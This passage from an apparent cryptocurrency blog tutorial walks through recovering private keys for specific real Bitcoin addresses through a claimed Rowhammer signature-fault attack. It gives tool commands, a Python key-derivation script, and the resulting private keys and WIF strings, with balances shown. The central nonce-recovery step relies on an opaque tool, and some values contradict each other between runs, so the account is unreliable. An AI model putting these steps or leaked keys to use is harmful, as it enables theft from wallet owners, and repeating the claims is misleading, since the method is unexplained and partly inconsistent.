<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-168-1024x434.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1311"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c

RawTX = 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-169-1024x93.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1313"></figure>



<p><code>(0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819 , 0x21ef3da06220ca412f63e331d3ad52effee2b6afe4bcbba76380f30abbf91f5b)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
point2gen  =   (0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819 , 0x21ef3da06220ca412f63e331d3ad52effee2b6afe4bcbba76380f30abbf91f5b)</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x326428d5b16a180127f67d9dbce5a500e572bf8ff5d7a8840b9704f8bea8fd9c
R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-171.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1316"></figure>



<p><code>PrivKey = cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP
WIF:  L47qg9KCcGYw1WkVKGA6EH6mAdMoD5WwXCT4Gyn8UxLGPbZ14AUz
HEX:  cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/003-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1302"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-164-1024x446.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1304"><figcaption><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 698.45</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№4</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-103-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1144"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-104-1024x204.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1146"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/18dcc93cea01e4bbd41a4e648ca6088fce67bb0a8e2cc231e42978dcdffd1591</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-172-1024x95.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1320"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-173-1024x238.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1322"></figure>



<pre class="wp-block-code"><code>R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-174-1024x295.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1324"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-175-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1326"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820

RawTX = 010000000161d00e5c5d90528fb69e727a481638d109b011c0944e17e21b4a8b06de7086ba1400000069463043021f057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb702200707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd0121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-176-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1328"></figure>



<p><code>(0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7 , 0xce504e53221559f480af279f313f5f4913f6b8c317561e570290e3b1b6da0a94)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
point2gen  =   (0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7 , 0xce504e53221559f480af279f313f5f4913f6b8c317561e570290e3b1b6da0a94)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820
R = 0x00057a78c3377aa63c69a6b8f85f86ba5ce433198bba2a3f91c64da614952fb7
S = 0x0707ef040813d2693a50dd7458bbf07c07ff28e2233a3adeb81120898d7ee4cd
Z = 0x6b260e8163bb2a68f5dea232134c0f2ceefe242564dba90632b72b10e0a3a91e


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-177.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1330"></figure>



<p><code>PrivKey = e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc
WIF:  L54WQgCucvc7HCQvYSKnKgiqMUXXXvPxEYZbpxFWTeqQQTuAsqhH
HEX:  e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/004.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1332"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-178-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1336"><figcaption><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 679.53</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p><p><a href="https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/17ea9403f628a1810ffa70858dd5411c455fbdc1fd8c7e2048c5e5ae5d2ac839</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-180-1024x97.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1339"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-181-1024x148.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1341"></figure>



<pre class="wp-block-code"><code>R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-182-1024x293.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1343"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-183-1024x429.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1344"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a

RawTX = 010000000178dc582ecec1c896cefa5c8207ef549ed7e052f386328530eec78869764bbaa21f0000006b483045022100cb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c36802205b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe87200121027625d44b04d7760766b280d683d3495a0532fd8e931e48cc546bf794286a9defffffffff013a020000000000001976a91464c2de8847e1ab5f767ae5ab8253d7522572ddf888ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xe83de16640c70e103fd24d2e10535896054861ba444f659ea17d953490821820</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-184-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1346"></figure>



<p><code>(0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368 , 0x37b895600595d773ef80780fadfb81f34ab997aafdee272e1baf1b199df853a3)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
point2gen  =   (0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368 , 0x37b895600595d773ef80780fadfb81f34ab997aafdee272e1baf1b199df853a3)
</code></pre>



<p><code>ALL CORRECT!</code></p>



